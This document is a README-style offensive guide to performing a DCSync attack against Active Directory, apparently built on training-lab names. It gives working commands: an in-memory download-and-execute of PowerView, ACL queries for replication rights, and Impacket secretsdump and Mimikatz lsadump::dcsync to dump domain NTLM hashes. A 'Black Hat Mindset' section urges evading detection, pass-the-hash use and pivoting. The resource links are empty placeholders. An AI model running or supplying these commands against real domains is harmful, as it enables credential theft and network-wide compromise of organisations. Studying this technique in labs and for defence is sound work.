# Active Directory DCSync Attack README

This README focuses on performing a DCSync attack to extract credentials (e.g., NTLM hashes) from a domain controller by abusing replication rights.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Identifying Replication Rights](#identifying-replication-rights)
- [Performing the DCSync Attack](#performing-the-dcsync-attack)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

A DCSync attack allows an attacker to impersonate a domain controller and request user credential data (e.g., NTLM hashes) by exploiting Active Directory replication rights (e.g., `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`). This guide covers PowerView to identify replication rights, and Impacket and Mimikatz to execute the attack. Commands are performed from Windows or Linux hosts, assuming you have compromised credentials with sufficient privileges.

## Setup and Prerequisites

- **Environment**: Windows host for PowerView and Mimikatz, Linux host for Impacket.
- **PowerView**: Load into memory on Windows:
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
  ```
- **Impacket**: Install on Linux:
  ```bash
  pip install impacket
  ```
- **Mimikatz**: Download the Mimikatz executable on Windows (e.g., from its GitHub repo) and place it in your working directory (e.g., `C:\Tools\`).
- **PowerShell**: Run with administrative privileges on Windows (right-click > "Run as Administrator").
- **Credentials**: Use compromised credentials (e.g., `INLANEFREIGHT\adunn`) with replication rights or sufficient privileges to access the domain controller.

## Identifying Replication Rights

Use PowerView to identify users with replication rights, a prerequisite for a successful DCSync attack.

```powershell
# Enumerate user information
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl

# Check replication rights
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
```

## Performing the DCSync Attack

Execute the DCSync attack to extract NTLM hashes from the domain controller.

```bash
# Using Impacket (Linux)
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss
```

```powershell
# Using Mimikatz (Windows)
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

## Black Hat Mindset

- **Target Privileged Users**: Focus on users with replication rights (e.g., members of Domain Admins or Enterprise Admins).
- **Stay Silent**: Perform the attack without modifying the domain to avoid detection by monitoring tools.
- **Use the Hashes**: Extracted NTLM hashes can be used for pass-the-hash attacks or cracking for plaintext passwords.
- **Expand Access**: Leverage the extracted credentials to pivot to other domain controllers or high-value targets.

## Resources

- [PowerView Documentation](#)
- [Impacket Guide](#)
- [Mimikatz DCSync](#)
- [DCSync Attack Explained](#)

